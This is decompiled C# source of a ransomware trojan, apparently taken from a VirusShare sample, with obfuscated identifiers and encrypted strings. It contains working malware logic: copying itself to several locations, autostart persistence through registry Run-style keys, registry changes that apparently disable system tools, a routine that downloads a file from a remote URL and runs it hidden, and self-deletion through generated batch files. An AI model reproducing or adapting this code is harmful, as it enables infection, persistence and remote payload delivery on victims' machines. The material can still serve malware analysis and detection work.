// Decompiled with JetBrains decompiler
// Type: 
// Assembly: audiohd, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B3C2E6D6-337D-408B-994E-703E532E1FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.PornoAsset.dkhr-b435741867a0fdbf28756592cb30b1bd1f0b2169008f656b542888b53198a9b8.exe

using ___codefort;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

internal sealed class \u0005
{
  private Mutex \u0002;

  public void \u0002()
  {
    this.\u0003();
    this.bd();
    this.\u0005();
  }

  private void \u0003()
  {
    try
    {
      this.\u0002 = new Mutex(true, \u000F.\u0002.\u0002);
      this.\u0002.ReleaseMutex();
    }
    catch
    {
      Environment.Exit(-1);
    }
  }

  private void \u0005()
  {
    string fileName = Process.GetCurrentProcess().MainModule.FileName;
    if (this.\u0002())
      return;
    try
    {
      string str1 = string.Empty;
      foreach (string destFileName in \u000F.\u0002.q)
      {
        if (!\u000F.\u0003.\u0003(destFileName))
          System.IO.File.Copy(fileName, destFileName);
        str1 = str1 + I.\u0002(737969857) + destFileName + I.\u0002(737969884);
      }
      string str2 = str1;
      TextWriter textWriter = (TextWriter) new StreamWriter(Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969899));
      textWriter.WriteLine(str2);
      textWriter.Close();
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969899)),
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }
    catch
    {
    }
    try
    {
      string str = Registry.LocalMachine.OpenSubKey(I.\u0002(737969798), true).GetValue(I.\u0002(737969850)).ToString();
      if (!str.Substring(str.Length - 1, 1).Equals(I.\u0002(737969739)) && !str.Substring(str.Length - 2, 2).Equals(I.\u0002(737969747)))
        str += I.\u0002(737969739);
      if (str.IndexOf(\u000F.\u0002.q[0]) < 0)
        Registry.LocalMachine.OpenSubKey(I.\u0002(737969798), true).SetValue(I.\u0002(737969850), (object) (str + I.\u0002(737969754) + \u000F.\u0002.q[0] + (object) '"'));
      Registry.CurrentUser.OpenSubKey(I.\u0002(737969773), true).SetValue(I.\u0002(737969702), (object) ('"'.ToString() + \u000F.\u0002.q[1] + (object) '"'));
    }
    catch
    {
    }
    try
    {
      this.\u0002.Close();
      foreach (string str in \u000F.\u0002.q)
        new Process()
        {
          StartInfo = {
            FileName = str,
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
    }
    catch
    {
    }
    Environment.Exit(-1);
  }

  public void \u0002(string _param1)
  {
    try
    {
      this.\u0002.Close();
    }
    catch
    {
    }
    try
    {
      string str = \u000F.\u0003.\u0002(new Random().Next(5, 12)) + I.\u0002(737969707);
      new WebClient().DownloadFile(_param1, Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969724) + str);
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969724) + str),
          WindowStyle = ProcessWindowStyle.Hidden
        }
      }.Start();
    }
    catch
    {
    }
    this.\u0006();
    Environment.Exit(-1);
  }

  public void \u0008()
  {
    try
    {
      string str = Registry.LocalMachine.OpenSubKey(I.\u0002(737969798), true).GetValue(I.\u0002(737969850)).ToString().Replace(I.\u0002(737970116) + \u000F.\u0002.q[0] + (object) '"', string.Empty);
      Registry.LocalMachine.OpenSubKey(I.\u0002(737969798), true).SetValue(I.\u0002(737969850), (object) str);
      Registry.CurrentUser.OpenSubKey(I.\u0002(737969773), true).SetValue(I.\u0002(737969702), (object) string.Empty);
    }
    catch
    {
    }
    try
    {
      string str1 = string.Empty;
      foreach (string str2 in \u000F.\u0002.q)
        str1 = str1 + I.\u0002(737970126) + str2 + I.\u0002(737970149) + str2 + I.\u0002(737969884);
      string str3 = str1;
      TextWriter textWriter = (TextWriter) new StreamWriter(Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969899));
      textWriter.WriteLine(str3);
      textWriter.Close();
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737969899)),
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }
    catch
    {
    }
    this.\u0006();
    Environment.Exit(-1);
  }

  private bool \u0002()
  {
    string[] q = \u000F.\u0002.q;
    int index = 0;
    if (index < q.Length)
    {
      string str = q[index];
      if (!\u000F.\u0003.\u0003(str))
        return false;
    }
    return true;
  }

  private void \u0006()
  {
    try
    {
      string str = I.\u0002(737970154) + (object) '"' + Environment.GetCommandLineArgs()[0] + (object) '"' + I.\u0002(737970171) + (object) '"' + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + (object) '"' + I.\u0002(737970058);
      TextWriter textWriter = (TextWriter) new StreamWriter(Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737970074));
      textWriter.WriteLine(str);
      textWriter.Close();
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable(I.\u0002(737969894)) + I.\u0002(737970074)),
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }
    catch
    {
    }
  }

  private void bd()
  {
    try
    {
      Registry.CurrentUser.OpenSubKey(I.\u0002(737970100), true).SetValue(I.\u0002(737970038), (object) I.\u0002(737969925), RegistryValueKind.DWord);
    }
    catch
    {
    }
    if (!\u000F.\u0002.\u0008)
      return;
    try
    {
      Registry.CurrentUser.OpenSubKey(I.\u0002(737970100), true).SetValue(I.\u0002(737969933), (object) I.\u0002(737969957), RegistryValueKind.DWord);
    }
    catch
    {
    }
    try
    {
      Registry.CurrentUser.OpenSubKey(I.\u0002(737969965), true).SetValue(I.\u0002(737969389), (object) I.\u0002(737969957), RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey(I.\u0002(737969965), true).SetValue(I.\u0002(737969389), (object) I.\u0002(737969957), RegistryValueKind.DWord);
    }
    catch
    {
    }
  }
}
